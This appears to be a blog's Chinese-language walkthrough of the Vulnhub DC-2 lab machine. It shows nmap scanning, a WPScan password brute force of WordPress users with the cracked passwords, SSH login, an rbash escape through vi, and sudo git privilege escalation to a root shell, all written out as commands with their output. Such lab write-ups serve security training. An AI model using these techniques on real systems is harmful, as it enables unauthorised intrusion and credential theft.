{"pageProps":{"postData":{"id":"VulnhubDC-2","contentHtml":"<h1>DC-2</h1>\n<blockquote>\n<p><a href=\"https://download.vulnhub.com/dc/DC-2.zip\">https://download.vulnhub.com/dc/DC-2.zip</a></p>\n</blockquote>\n<h2>主机发现端口扫描</h2>\n<ol>\n<li>\n<p>使用nmap扫描网段类存活主机</p>\n<p>因为靶机是我最后添加的，所以靶机IP是<code>157</code></p>\n<pre><code class=\"hljs language-php\">nmap -sP <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.0</span>/<span class=\"hljs-number\">24</span>     \n<span class=\"hljs-comment\">//            </span>\nStarting Nmap <span class=\"hljs-number\">7.93</span> ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-09-28 19:51 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.1</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00030</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:C0:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">08</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.2</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00027</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:FB:CA:<span class=\"hljs-number\">45</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.157</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00095</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">9</span>B:<span class=\"hljs-number\">07</span>:<span class=\"hljs-number\">95</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.254</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00067</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:FB:E7:<span class=\"hljs-title function_ invoke__\">F4</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.151</span>\nHost is up.\n</code></pre>\n</li>\n<li>\n<p>扫描主机开放端口</p>\n<pre><code class=\"hljs language-php\">nmap -sT -min-rate <span class=\"hljs-number\">10000</span> -p- <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.157</span>\n<span class=\"hljs-comment\">//</span>\nStarting Nmap <span class=\"hljs-number\">7.93</span> ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-09-28 20:39 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.157</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.0056</span>s latency).\nNot shown: <span class=\"hljs-number\">65533</span> closed tcp <span class=\"hljs-title function_ invoke__\">ports</span> (conn-refused)\nPORT     STATE SERVICE\n<span class=\"hljs-number\">80</span>/tcp   open  http\n<span class=\"hljs-number\">7744</span>/tcp open  raqmon-pdu\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">9</span>B:<span class=\"hljs-number\">07</span>:<span class=\"hljs-number\">95</span> (VMware)\n</code></pre>\n</li>\n<li>\n<p>扫描主机服务版本以及系统版本</p>\n<pre><code class=\"hljs language-php\">nmap -sT -sV -O -p <span class=\"hljs-number\">80</span>,<span class=\"hljs-number\">7744</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.157</span>  \n<span class=\"hljs-comment\">//</span>\nStarting Nmap <span class=\"hljs-number\">7.93</span> ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-09-28 20:40 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.157</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00096</span>s latency).\n\nPORT     STATE SERVICE VERSION\n<span class=\"hljs-number\">80</span>/tcp   open  http    Apache httpd <span class=\"hljs-number\">2.4</span>.<span class=\"hljs-number\">10</span> ((Debian))\n<span class=\"hljs-number\">7744</span>/tcp open  ssh     OpenSSH <span class=\"hljs-number\">6.7</span>p1 Debian <span class=\"hljs-number\">5</span>+<span class=\"hljs-title function_ invoke__\">deb8u7</span> (protocol <span class=\"hljs-number\">2.0</span>)\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">9</span>B:<span class=\"hljs-number\">07</span>:<span class=\"hljs-number\">95</span> (VMware)\nWarning: OSScan results may be unreliable because we could not find at least <span class=\"hljs-number\">1</span> open <span class=\"hljs-keyword\">and</span> <span class=\"hljs-number\">1</span> closed port\nDevice type: general purpose\nRunning: Linux <span class=\"hljs-number\">3</span>.X|<span class=\"hljs-number\">4</span>.X\nOS CPE: cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">3</span> cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">4</span>\nOS details: Linux <span class=\"hljs-number\">3.2</span> - <span class=\"hljs-number\">4.9</span>\nNetwork Distance: <span class=\"hljs-number\">1</span> hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n</code></pre>\n<p>原来<code>7744</code>是<code>SSH</code></p>\n</li>\n<li>\n<p>扫描漏洞</p>\n<pre><code class=\"hljs language-sql\">nmap <span class=\"hljs-operator\">-</span>script<span class=\"hljs-operator\">=</span>vuln <span class=\"hljs-operator\">-</span>p80,<span class=\"hljs-number\">7744</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.157</span>\n<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span>\nStarting Nmap <span class=\"hljs-number\">7.93</span> ( https:<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span>nmap.org ) <span class=\"hljs-keyword\">at</span> <span class=\"hljs-number\">2024</span><span class=\"hljs-number\">-09</span><span class=\"hljs-number\">-28</span> <span class=\"hljs-number\">20</span>:<span class=\"hljs-number\">48</span> CST\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.157</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.0013</span>s latency).\n\nPORT     STATE SERVICE\n<span class=\"hljs-number\">80</span><span class=\"hljs-operator\">/</span>tcp   <span class=\"hljs-keyword\">open</span>  http\n<span class=\"hljs-operator\">|</span>_http<span class=\"hljs-operator\">-</span>dombased<span class=\"hljs-operator\">-</span>xss: Couldn<span class=\"hljs-string\">'t find any DOM based XSS.\n|_http-stored-xss: Couldn'</span>t find <span class=\"hljs-keyword\">any</span> stored XSS vulnerabilities.\n<span class=\"hljs-operator\">|</span> http<span class=\"hljs-operator\">-</span>wordpress<span class=\"hljs-operator\">-</span>users: \n<span class=\"hljs-operator\">|</span> Username found: admin\n<span class=\"hljs-operator\">|</span> Username found: tom\n<span class=\"hljs-operator\">|</span> Username found: jerry\n<span class=\"hljs-operator\">|</span>_Search stopped <span class=\"hljs-keyword\">at</span> ID #<span class=\"hljs-number\">25.</span> Increase the upper limit if necessary <span class=\"hljs-keyword\">with</span> <span class=\"hljs-string\">'http-wordpress-users.limit'</span>\n<span class=\"hljs-operator\">|</span> http<span class=\"hljs-operator\">-</span>enum: \n<span class=\"hljs-operator\">|</span>   <span class=\"hljs-operator\">/</span>wp<span class=\"hljs-operator\">-</span>login.php: Possible admin folder\n<span class=\"hljs-operator\">|</span>   <span class=\"hljs-operator\">/</span>readme.html: Wordpress version: <span class=\"hljs-number\">2</span> \n<span class=\"hljs-operator\">|</span>   <span class=\"hljs-operator\">/</span>wp<span class=\"hljs-operator\">-</span>includes<span class=\"hljs-operator\">/</span>images<span class=\"hljs-operator\">/</span>rss.png: Wordpress version <span class=\"hljs-number\">2.2</span> found.\n<span class=\"hljs-operator\">|</span>   <span class=\"hljs-operator\">/</span>wp<span class=\"hljs-operator\">-</span>includes<span class=\"hljs-operator\">/</span>js<span class=\"hljs-operator\">/</span>jquery<span class=\"hljs-operator\">/</span>suggest.js: Wordpress version <span class=\"hljs-number\">2.5</span> found.\n<span class=\"hljs-operator\">|</span>   <span class=\"hljs-operator\">/</span>wp<span class=\"hljs-operator\">-</span>includes<span class=\"hljs-operator\">/</span>images<span class=\"hljs-operator\">/</span>blank.gif: Wordpress version <span class=\"hljs-number\">2.6</span> found.\n<span class=\"hljs-operator\">|</span>   <span class=\"hljs-operator\">/</span>wp<span class=\"hljs-operator\">-</span>includes<span class=\"hljs-operator\">/</span>js<span class=\"hljs-operator\">/</span>comment<span class=\"hljs-operator\">-</span>reply.js: Wordpress version <span class=\"hljs-number\">2.7</span> found.\n<span class=\"hljs-operator\">|</span>   <span class=\"hljs-operator\">/</span>wp<span class=\"hljs-operator\">-</span>login.php: Wordpress login page.\n<span class=\"hljs-operator\">|</span>   <span class=\"hljs-operator\">/</span>wp<span class=\"hljs-operator\">-</span>admin<span class=\"hljs-operator\">/</span>upgrade.php: Wordpress login page.\n<span class=\"hljs-operator\">|</span>_  <span class=\"hljs-operator\">/</span>readme.html: Interesting, a readme.\n<span class=\"hljs-operator\">|</span>_http<span class=\"hljs-operator\">-</span>csrf: Couldn<span class=\"hljs-string\">'t find any CSRF vulnerabilities.\n7744/tcp open  raqmon-pdu\nMAC Address: 00:0C:29:9B:07:95 (VMware)\n</span></code></pre>\n</li>\n</ol>\n<h2>web渗透</h2>\n<ol>\n<li>\n<p>前面<code>nmap</code>扫描出是<code>wordpress</code>的CMS,并且得出几个用户名<code>admin</code> <code>tom</code> <code>jerry</code> ,和一些让人感兴趣的路径</p>\n<p>进入主页存在<code>flag</code>选项卡得到<code>flag1</code></p>\n<p><img src=\"/post-images/VulnhubDC-2/image24.png\" alt=\"image.png\"></p>\n<pre><code class=\"hljs language-sql\"># flag1\nYour usual wordlists probably won’t work, so instead, maybe you just need <span class=\"hljs-keyword\">to</span> be cewl.\n\nMore passwords <span class=\"hljs-keyword\">is</span> always better, but sometimes you just can’t win them all.\n\nLog <span class=\"hljs-keyword\">in</span> <span class=\"hljs-keyword\">as</span> <span class=\"hljs-keyword\">one</span> <span class=\"hljs-keyword\">to</span> see the next flag.\n\nIf you can’t find it, log <span class=\"hljs-keyword\">in</span> <span class=\"hljs-keyword\">as</span> another\n</code></pre>\n<p>提示到呢<code>cewl</code> ，先用<code>cewl</code> 对<code>dc-2</code> 生成字典，备用</p>\n<pre><code class=\"hljs language-sql\">cewl http:<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span>dc<span class=\"hljs-number\">-2</span> <span class=\"hljs-operator\">></span> dc2.txt\n</code></pre>\n</li>\n<li>\n<p>F12可以找到wordpress版本是<code>WordPress 4.7.10</code> ，得知当前用户 <code>admin</code> <code>tom</code> <code>jerry</code> 将他们存为<code>dc2u.txt</code> ,通过<code>flag1</code>给的提示，使用上面生成<code>dc2.txt</code> 来做用户密码爆破</p>\n<pre><code class=\"hljs language-sql\">wpscan <span class=\"hljs-comment\">--url http://dc-2 -U dc2u.txt -P dc2.txt </span>\n<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span>\n_______________________________________________________________\n         __          _______   _____\n         \\ \\        <span class=\"hljs-operator\">/</span> <span class=\"hljs-operator\">/</span>  __ \\ <span class=\"hljs-operator\">/</span> ____<span class=\"hljs-operator\">|</span>\n          \\ \\  <span class=\"hljs-operator\">/</span>\\  <span class=\"hljs-operator\">/</span> <span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">|</span> <span class=\"hljs-operator\">|</span>__) <span class=\"hljs-operator\">|</span> (___   ___  __ _ _ __ ®\n           \\ \\<span class=\"hljs-operator\">/</span>  \\<span class=\"hljs-operator\">/</span> <span class=\"hljs-operator\">/</span> <span class=\"hljs-operator\">|</span>  ___<span class=\"hljs-operator\">/</span> \\___ \\ <span class=\"hljs-operator\">/</span> __<span class=\"hljs-operator\">|</span><span class=\"hljs-operator\">/</span> _` <span class=\"hljs-operator\">|</span> <span class=\"hljs-string\">'_ \\\n            \\  /\\  /  | |     ____) | (__| (_| | | | |\n             \\/  \\/   |_|    |_____/ \\___|\\__,_|_| |_|\n\n         WordPress Security Scanner by the WPScan Team\n                         Version 3.8.22\n       Sponsored by Automattic - https://automattic.com/\n       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart\n_______________________________________________________________\n\n[+] URL: http://dc-2/ [192.168.75.157]\n[+] Started: Sat Sep 28 21:41:44 2024\n\nInteresting Finding(s):\n\n[+] Headers\n | Interesting Entry: Server: Apache/2.4.10 (Debian)\n | Found By: Headers (Passive Detection)\n | Confidence: 100%\n\n[+] XML-RPC seems to be enabled: http://dc-2/xmlrpc.php\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 100%\n | References:\n |  - http://codex.wordpress.org/XML-RPC_Pingback_API\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/\n |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/\n\n[+] WordPress readme found: http://dc-2/readme.html\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 100%\n\n[+] The external WP-Cron seems to be enabled: http://dc-2/wp-cron.php\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 60%\n | References:\n |  - https://www.iplocation.net/defend-wordpress-from-ddos\n |  - https://github.com/wpscanteam/wpscan/issues/1299\n\n[+] WordPress version 4.7.10 identified (Insecure, released on 2018-04-03).\n | Found By: Rss Generator (Passive Detection)\n |  - http://dc-2/index.php/feed/, &#x3C;generator>https://wordpress.org/?v=4.7.10&#x3C;/generator>\n |  - http://dc-2/index.php/comments/feed/, &#x3C;generator>https://wordpress.org/?v=4.7.10&#x3C;/generator>\n\n[+] WordPress theme in use: twentyseventeen\n | Location: http://dc-2/wp-content/themes/twentyseventeen/\n | Last Updated: 2024-07-16T00:00:00.000Z\n | Readme: http://dc-2/wp-content/themes/twentyseventeen/README.txt\n | [!] The version is out of date, the latest version is 3.7\n | Style URL: http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10\n | Style Name: Twenty Seventeen\n | Style URI: https://wordpress.org/themes/twentyseventeen/\n | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...\n | Author: the WordPress team\n | Author URI: https://wordpress.org/\n |\n | Found By: Css Style In Homepage (Passive Detection)\n |\n | Version: 1.2 (80% confidence)\n | Found By: Style (Passive Detection)\n |  - http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10, Match: '</span>Version: <span class=\"hljs-number\">1.2</span><span class=\"hljs-string\">'\n\n[+] Enumerating All Plugins (via Passive Methods)\n\n[i] No plugins Found.\n\n[+] Enumerating Config Backups (via Passive and Aggressive Methods)\n Checking Config Backups - Time: 00:00:00 &#x3C;====================================================> (137 / 137) 100.00% Time: 00:00:00\n\n[i] No Config Backups Found.\n\n[+] Performing password attack on Xmlrpc against 3 user/s\nTrying root / CeWL 6.2.1 (More Fixes) Robin Wood (robin@digi.ninja) (https://digi.ninja/) Time: 00:00:00 &#x3C;> (0 / 717)  0.00%  ETA: Trying jerry / CeWL 6.2.1 (More Fixes) Robin Wood (robin@digi.ninja) (https://digi.ninja/) Time: 00:00:00 &#x3C;> (3 / 717)  0.41%  ETA:[SUCCESS] - jerry / adipiscing                                                                                                     \n[SUCCESS] - tom / parturient                                                                                                       \nTrying root / flag Time: 00:01:04 &#x3C;==================================                          > (649 / 1127) 57.58%  ETA: ??:??:??\n\n[!] Valid Combinations Found:\n | Username: jerry, Password: adipiscing\n | Username: tom, Password: parturient\n\n[!] No WPScan API Token given, as a result vulnerability data has not been output.\n[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register\n</span></code></pre>\n<p>得到 <code>tom</code> <code>jerry</code> 的密码</p>\n<pre><code class=\"hljs language-sql\"><span class=\"hljs-operator\">|</span> Username: jerry, Password: adipiscing\n<span class=\"hljs-operator\">|</span> Username: tom, Password: parturient\n</code></pre>\n</li>\n<li>\n<p>登陆后台</p>\n<ul>\n<li>\n<p>先登录<code>jerry</code>的后台</p>\n<p>在主页 <code>Pages</code> 里面可以找到 <code>flag2</code></p>\n<pre><code class=\"hljs language-sql\">Flag <span class=\"hljs-number\">2</span>:\n\nIf you can<span class=\"hljs-string\">'t exploit WordPress and take a shortcut, there is another way.\n\nHope you found another entry point.\n</span></code></pre>\n<p><code>jerry</code>的<code>email</code>  <a href=\"mailto:jerry@notreallyanywhere.net\">jerry@notreallyanywhere.net</a></p>\n</li>\n<li>\n<p><code>tom</code> 的后台</p>\n<p>没有可利用的</p>\n</li>\n</ul>\n</li>\n<li>\n<p>根据 <code>Hope you found another entry point.</code> ，因为<code>7744</code>端口是<code>ssh</code>，使用这两个用户尝试登录</p>\n<ul>\n<li>\n<p>使用tom登陆成功，获得shell</p>\n<pre><code class=\"hljs language-sql\">ssh tom<span class=\"hljs-variable\">@192</span><span class=\"hljs-number\">.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.157</span> <span class=\"hljs-operator\">-</span>p <span class=\"hljs-number\">7744</span>\ntom<span class=\"hljs-variable\">@192</span><span class=\"hljs-number\">.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.157</span><span class=\"hljs-string\">'s password: \n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\ntom@DC-2:~$ \n</span></code></pre>\n</li>\n<li>\n<p>当前目录下下存在 <code>flag3.txt</code> ,发现 <code>vim</code> <code>cat</code> <code>more</code> 等命令是使用不了的，用的是 <code>vi</code></p>\n<pre><code class=\"hljs language-sql\">Poor <span class=\"hljs-keyword\">old</span> Tom <span class=\"hljs-keyword\">is</span> always <span class=\"hljs-keyword\">running</span> after Jerry. Perhaps he should su <span class=\"hljs-keyword\">for</span> <span class=\"hljs-keyword\">all</span> the stress he causes.\n</code></pre>\n</li>\n<li>\n<p>查看<code>tom</code>可以使用的命令</p>\n<pre><code class=\"hljs language-sql\">tom<span class=\"hljs-variable\">@DC</span><span class=\"hljs-number\">-2</span>:<span class=\"hljs-operator\">~</span>$ ls <span class=\"hljs-operator\">-</span>al usr<span class=\"hljs-operator\">/</span>bin\n<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span>\nlrwxrwxrwx <span class=\"hljs-number\">1</span> tom tom   <span class=\"hljs-number\">13</span> Mar <span class=\"hljs-number\">21</span>  <span class=\"hljs-number\">2019</span> less <span class=\"hljs-operator\">-</span><span class=\"hljs-operator\">></span> <span class=\"hljs-operator\">/</span>usr<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>less\nlrwxrwxrwx <span class=\"hljs-number\">1</span> tom tom    <span class=\"hljs-number\">7</span> Mar <span class=\"hljs-number\">21</span>  <span class=\"hljs-number\">2019</span> ls <span class=\"hljs-operator\">-</span><span class=\"hljs-operator\">></span> <span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>ls\nlrwxrwxrwx <span class=\"hljs-number\">1</span> tom tom   <span class=\"hljs-number\">12</span> Mar <span class=\"hljs-number\">21</span>  <span class=\"hljs-number\">2019</span> scp <span class=\"hljs-operator\">-</span><span class=\"hljs-operator\">></span> <span class=\"hljs-operator\">/</span>usr<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>scp\nlrwxrwxrwx <span class=\"hljs-number\">1</span> tom tom   <span class=\"hljs-number\">11</span> Mar <span class=\"hljs-number\">21</span>  <span class=\"hljs-number\">2019</span> vi <span class=\"hljs-operator\">-</span><span class=\"hljs-operator\">></span> <span class=\"hljs-operator\">/</span>usr<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>vi\n</code></pre>\n</li>\n<li>\n<p>根据 <code>flag3</code>的提示</p>\n<pre><code class=\"hljs language-sql\">Poor <span class=\"hljs-keyword\">old</span> Tom <span class=\"hljs-keyword\">is</span> always <span class=\"hljs-keyword\">running</span> after Jerry. Perhaps he should su <span class=\"hljs-keyword\">for</span> <span class=\"hljs-keyword\">all</span> the stress he causes.\n</code></pre>\n<p>提示 <code>su for ..</code></p>\n<p>因为我们的<code>shell</code>是<code>rbash</code> ，所以可能是<code>rbash</code>逃逸</p>\n<pre><code class=\"hljs language-sql\">vi flag3.txt\n\n:<span class=\"hljs-keyword\">set</span> shell<span class=\"hljs-operator\">=</span><span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>sh\n:shell\n<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span>进入shell\n<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span>然后设置命令，不然就那几个\nexport PATH<span class=\"hljs-operator\">=</span>$PATH:<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>\nexport PATH<span class=\"hljs-operator\">=</span>$PATH:<span class=\"hljs-operator\">/</span>usr<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>\n<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span>env 查看环境变量\n</code></pre>\n<p>根据提示 <code>su jerry</code> 使用之前得到的密码，登陆成功</p>\n</li>\n<li>\n<p>当前目录下存在<code>flag4</code></p>\n<pre><code class=\"hljs language-sql\">jerry<span class=\"hljs-variable\">@DC</span><span class=\"hljs-number\">-2</span>:<span class=\"hljs-operator\">~</span>$ cat flag4.txt\nGood <span class=\"hljs-keyword\">to</span> see that you<span class=\"hljs-string\">'ve made it this far - but you'</span>re <span class=\"hljs-keyword\">not</span> home yet. \n\nYou still need <span class=\"hljs-keyword\">to</span> <span class=\"hljs-keyword\">get</span> the <span class=\"hljs-keyword\">final</span> flag (the <span class=\"hljs-keyword\">only</span> flag that really counts<span class=\"hljs-operator\">!</span><span class=\"hljs-operator\">!</span><span class=\"hljs-operator\">!</span>).  \n\n<span class=\"hljs-keyword\">No</span> hints here <span class=\"hljs-operator\">-</span> you<span class=\"hljs-string\">'re on your own now.  :-)\n\nGo on - git outta here!!!!\n</span></code></pre>\n<p><code>git outta</code> 提示 <code>git</code> 提权（属于sudo提权里面的）</p>\n</li>\n<li>\n<p>查看当前权限，刚好是<code>git</code></p>\n<pre><code class=\"hljs language-sql\">jerry<span class=\"hljs-variable\">@DC</span><span class=\"hljs-number\">-2</span>:<span class=\"hljs-operator\">~</span>$ sudo <span class=\"hljs-operator\">-</span>l\nMatching Defaults entries <span class=\"hljs-keyword\">for</span> jerry <span class=\"hljs-keyword\">on</span> DC<span class=\"hljs-number\">-2</span>:\n    env_reset, mail_badpass, secure_path<span class=\"hljs-operator\">=</span><span class=\"hljs-operator\">/</span>usr<span class=\"hljs-operator\">/</span><span class=\"hljs-keyword\">local</span><span class=\"hljs-operator\">/</span>sbin\\:<span class=\"hljs-operator\">/</span>usr<span class=\"hljs-operator\">/</span><span class=\"hljs-keyword\">local</span><span class=\"hljs-operator\">/</span>bin\\:<span class=\"hljs-operator\">/</span>usr<span class=\"hljs-operator\">/</span>sbin\\:<span class=\"hljs-operator\">/</span>usr<span class=\"hljs-operator\">/</span>bin\\:<span class=\"hljs-operator\">/</span>sbin\\:<span class=\"hljs-operator\">/</span>bin\n\n<span class=\"hljs-keyword\">User</span> jerry may run the following commands <span class=\"hljs-keyword\">on</span> DC<span class=\"hljs-number\">-2</span>:\n    (root) NOPASSWD: <span class=\"hljs-operator\">/</span>usr<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>git\n</code></pre>\n</li>\n<li>\n<p><code>git</code>提权</p>\n<pre><code class=\"hljs language-sql\">sudo git help config\n:<span class=\"hljs-operator\">!</span><span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>bash\n</code></pre>\n<pre><code class=\"hljs language-sql\">root<span class=\"hljs-variable\">@DC</span><span class=\"hljs-number\">-2</span>:<span class=\"hljs-operator\">/</span>home<span class=\"hljs-operator\">/</span>jerry#\n</code></pre>\n</li>\n<li>\n<p>获得<code>root</code>权限后，读取加目录下的<code>finalflag</code>即可</p>\n<pre><code class=\"hljs language-sql\">root<span class=\"hljs-variable\">@DC</span><span class=\"hljs-number\">-2</span>:<span class=\"hljs-operator\">~</span># cat <span class=\"hljs-keyword\">final</span><span class=\"hljs-operator\">-</span>flag.txt \n<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span>\n __    __     _ _       _                    _ \n<span class=\"hljs-operator\">/</span> <span class=\"hljs-operator\">/</span> <span class=\"hljs-operator\">/</span>\\ \\ \\___<span class=\"hljs-operator\">|</span> <span class=\"hljs-operator\">|</span> <span class=\"hljs-operator\">|</span>   __<span class=\"hljs-operator\">|</span> <span class=\"hljs-operator\">|</span> ___  _ __   ___  <span class=\"hljs-operator\">/</span> \\\n\\ \\<span class=\"hljs-operator\">/</span>  \\<span class=\"hljs-operator\">/</span> <span class=\"hljs-operator\">/</span> _ \\ <span class=\"hljs-operator\">|</span> <span class=\"hljs-operator\">|</span>  <span class=\"hljs-operator\">/</span> _` <span class=\"hljs-operator\">|</span><span class=\"hljs-operator\">/</span> _ \\<span class=\"hljs-operator\">|</span> <span class=\"hljs-string\">'_ \\ / _ \\/  /\n \\  /\\  /  __/ | | | (_| | (_) | | | |  __/\\_/ \n  \\/  \\/ \\___|_|_|  \\__,_|\\___/|_| |_|\\___\\/   \n\nCongratulatons!!!\n\nA special thanks to all those who sent me tweets\nand provided me with feedback - it'</span>s <span class=\"hljs-keyword\">all</span> greatly\nappreciated.\n\nIf you enjoyed this CTF, send me a tweet via <span class=\"hljs-variable\">@DCAU7</span>.\n</code></pre>\n</li>\n</ul>\n</li>\n</ol>","title":"Vulnhub - DC-2","date":"2025-04-02","updated":"2025-04-02","comments":true,"tags":["Vulnhub"],"categories":"靶机"},"recentPosts":[{"id":"HackTheBoxMachine - Cap","title":"HackTheBox - Machine - Cap","date":"2025-06-11","isEncrypted":false,"year":"2025","month":"06","day":"11"},{"id":"Personalsunset","title":"Personal - sunset","date":"2025-06-10","isEncrypted":true,"year":"2025","month":"06","day":"10"},{"id":"HackTheBoxSeason8 - TombWatcher","title":"HackTheBox - Season8 - TombWatcher","date":"2025-06-08","isEncrypted":true,"year":"2025","month":"06","day":"08"},{"id":"HackTheBoxMachine - Bucket","title":"HackTheBox - Machine - Bucket","date":"2025-06-06","isEncrypted":false,"year":"2025","month":"06","day":"06"},{"id":"HackTheBoxMachine -Support","title":"HackTheBox - Machine - Support","date":"2025-06-05","isEncrypted":false,"year":"2025","month":"06","day":"05"},{"id":"HackTheBoxMachine - Hospital","title":"HackTheBox - Machine - Hospital","date":"2025-06-04","isEncrypted":false,"year":"2025","month":"06","day":"04"},{"id":"HackTheBoxSeason8 - Certificate","title":"HackTheBox - Season8 - Certificate","date":"2025-06-02","isEncrypted":true,"year":"2025","month":"06","day":"02"}]},"__N_SSG":true}